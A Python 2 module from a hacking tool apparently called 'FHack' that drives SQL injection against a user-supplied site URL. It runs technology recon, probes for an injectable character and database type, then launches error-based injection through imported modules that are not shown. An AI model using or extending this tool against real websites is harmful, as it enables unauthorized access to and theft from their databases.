"""
    - created on march/12/2019
    - author topcodermc
    -- [ description of this module:
        with this module FHack is able for sqlinjection and exploit them
    ]
"""

try:

    from .Banner import MASK
    from src.Colors import TextColor
    from .modules.handlers.TechnologyRecon import TechnologyRecon
    from .modules.handlers.FindVulnerability import FindVulnerability
    from .modules.handlers.Injector import StartInjectionMethods

    import requests as reqs
    from sys import stdout

except Exception as error:
    raise SystemExit, TextColor.RED + '[-] Something is wrong at SqlInjection as: %s' % error + TextColor.WHITE


def StartInjection():
    MASK()

    print TextColor.WARNING + 'e.g: http://example.com/index.php?id=' + TextColor.WHITE
    stdout.write(TextColor.PURPLE + '~ Fhack/Sqlinjection/# Enter site url: ' + TextColor.WHITE)

    url = raw_input(TextColor.WHITESMOKE + '' + TextColor.WHITE)

    """ Step for sql injection
        
        1. let's know what the programming language of web site is
        2. find vulnerability
        
    """

    # step 1
    techRecon = TechnologyRecon(url)
    codeLang = techRecon.CheckLang()
    print TextColor.GREEN + '[!] Language of site: %s' % codeLang + TextColor.WHITE

    # step 2 => get character for sql injection phrase and kind of database that target used
    findVuln = FindVulnerability(url, codeLang)
    del codeLang, techRecon

    result_FindVuln_GET_Char = findVuln.Start()  # get character that we can use for exploit
    '''
        :object: result_FindVuln_GET_Char instance of Dictionary and we get  =>
        {
            char: '',
            database: ''
        } 
    '''
    if result_FindVuln_GET_Char is None or isinstance(result_FindVuln_GET_Char, dict) is False:
        print TextColor.WHITESMOKE + '[-] Site is not vulnerable to sql injection' + TextColor.WHITE
        return

    """
    {
        In this place we must first check that what method of injection we must use
    }
    """


    # Sql injection classic (ErrorBase)
    # step 3 => Start injecting and get count of columns of database
    StartInjectionMethods(
        db=result_FindVuln_GET_Char['database'],
        character=result_FindVuln_GET_Char['char'],
        url=url
    )
    # End order base
